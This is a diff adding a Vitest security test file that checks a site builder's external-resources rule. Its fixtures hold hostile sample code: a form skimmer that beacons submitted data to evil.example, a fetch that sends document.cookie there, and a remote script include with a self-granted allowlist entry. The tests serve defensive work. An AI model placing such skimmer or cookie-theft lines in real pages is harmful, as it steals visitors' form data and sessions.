@@ -1,0 +1,36 @@
+// Security review S1 (docs/reviews/2026-10-30-security-review.md), restored by #649.
+import type { SiteDoc } from "@webforge/model";
+import { describe, expect, it } from "vitest";
+import { element, findIn, siteWith } from "../test-site.test-helper.js";
+import { externalResourcesRule } from "./external.js";
+
+const withCode = (site: SiteDoc, code: Partial<SiteDoc["code"]>, allowed: string[] = []) => ({
+  ...site,
+  code: { ...site.code, ...code },
+  settings: { ...site.settings, allowedExternalUrls: allowed },
+});
+
+describe("security: script from an opened site file", () => {
+  it("reports a Custom Code script that sends data to another website with sendBeacon", () => {
+    const skimmer = element("CustomCode", "footer-code", {
+      code: "<script>document.addEventListener('submit',e=>navigator.sendBeacon('https://evil.example/s',new FormData(e.target)))</script>",
+    });
+    expect(findIn(externalResourcesRule, siteWith([skimmer])).length).toBeGreaterThan(0);
+  });
+
+  it("reports site code that sends data to another website with fetch", () => {
+    const site = withCode(siteWith([]), {
+      js: 'fetch("https://evil.example/c?"+document.cookie);',
+    });
+    expect(findIn(externalResourcesRule, site).length).toBeGreaterThan(0);
+  });
+
+  it("does not let the site file pre-allow its own host for a script", () => {
+    const site = withCode(
+      siteWith([]),
+      { bodyEnd: '<script src="https://evil.example/x.js"></script>' },
+      ["https://evil.example/"],
+    );
+    expect(findIn(externalResourcesRule, site).length).toBeGreaterThan(0);
+  });
+});
